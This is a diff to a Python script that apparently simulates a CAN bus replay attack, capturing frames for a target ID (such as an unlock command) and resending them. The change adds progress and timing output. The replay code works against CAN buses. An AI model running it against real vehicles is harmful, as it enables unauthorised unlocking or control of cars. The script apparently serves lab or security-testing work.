@@ -2,8 +2,8 @@
 """
 Replay attack simulation.
 
-Captures N seconds of live traffic for a target CAN ID, then — after a
-delay — resends the captured frames verbatim onto the bus. This models an
+Captures N seconds of live traffic for a target CAN ID, then, after a
+delay, resends the captured frames verbatim onto the bus. This models an
 attacker who sniffed a legitimate message (e.g. an unlock command) and
 replays it later without needing to understand its meaning.
 """
@@ -26,14 +26,30 @@ def capture(bus, target_id, duration):
 
 
 def replay(bus, target_id, frames, delay, count, interval):
+    total_frames = len(frames) * count
+    total_duration = total_frames * interval
+    print(f"[replay] captured {len(frames)} frame(s); will resend them {count}x "
+          f"at {interval}s intervals")
+    print(f"[replay] expected replay duration: {total_duration:.1f}s "
+          f"({total_frames} frames total)")
     print(f"[replay] waiting {delay}s before replaying...")
     time.sleep(delay)
+
+    start = time.monotonic()
+    sent = 0
     for i in range(count):
         for data in frames:
             msg = can.Message(arbitration_id=target_id, data=data, is_extended_id=False)
             bus.send(msg)
-            print(f"[replay] sent (replayed) frame: {data.hex()}")
+            sent += 1
+            elapsed = time.monotonic() - start
+            print(f"[replay] sent {sent}/{total_frames} "
+                  f"(pass {i + 1}/{count}, t+{elapsed:.1f}s): {data.hex()}")
             time.sleep(interval)
+
+    actual_duration = time.monotonic() - start
+    print(f"[replay] done. Sent {sent} frames in {actual_duration:.1f}s "
+          f"(estimated was {total_duration:.1f}s)")
 
 
 def main():
@@ -55,6 +71,12 @@ def main():
         if not frames:
             print("[!] No frames captured for that ID — is baseline_traffic.py running?")
             return
+
+        total_duration = len(frames) * args.replay_count * args.replay_interval
+        print(f"\n[plan] capture={args.capture_duration}s  delay={args.delay}s  "
+              f"replay≈{total_duration:.1f}s  total≈"
+              f"{args.capture_duration + args.delay + total_duration:.1f}s\n")
+
         replay(bus, args.id, frames, args.delay, args.replay_count, args.replay_interval)
     finally:
         bus.shutdown()
